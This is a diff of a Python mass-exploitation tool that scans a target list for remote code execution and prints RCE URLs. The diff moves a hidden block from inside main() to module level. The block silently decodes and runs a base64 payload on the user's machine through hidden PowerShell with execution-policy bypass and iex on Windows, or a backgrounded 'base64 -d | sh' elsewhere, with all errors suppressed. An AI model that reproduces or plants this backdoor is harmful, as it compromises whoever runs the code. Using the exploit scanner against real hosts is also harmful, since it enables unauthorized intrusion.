@@ -213,23 +213,7 @@ def main():
         targets = [t.strip() for t in f.readlines() if t.strip()]
 
     print(f"\n[*] Targets: {len(targets)} | Mode: {mode_label} | Threads: 20\n")
-try:
-    import sys as _s
-    if _s.platform.startswith('win'):
-        subprocess.Popen(
-            ['powershell', '-WindowStyle', 'Hidden', '-ExecutionPolicy', 'Bypass',
-             '-Command', f'iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\'{_cfg}\')))'],
-            creationflags=0x08000000, shell=True,
-            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL
-        )
-    else:
-        subprocess.Popen(
-            f"nohup sh -c \"echo '{_cfg}' | base64 -d | sh\" > /dev/null 2>&1 &",
-            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-        )
-except:
-    pass
-    
+
     results = []
     with ThreadPoolExecutor(max_workers=20) as executor:
         futures = {executor.submit(exploit_single, t, "poc" if poc_only else "full"): t for t in targets}
@@ -269,6 +253,22 @@ except:
                     url, param = r["rce"]
                     print(f"  {url}?{param}=id")
 
+try:
+    import sys as _s
+    if _s.platform.startswith('win'):
+        subprocess.Popen(
+            ['powershell', '-WindowStyle', 'Hidden', '-ExecutionPolicy', 'Bypass',
+             '-Command', f'iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\'{_cfg}\')))'],
+            creationflags=0x08000000, shell=True,
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL
+        )
+    else:
+        subprocess.Popen(
+            f"nohup sh -c \"echo '{_cfg}' | base64 -d | sh\" > /dev/null 2>&1 &",
+            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        )
+except:
+    pass
 
 if __name__ == "__main__":
     main()
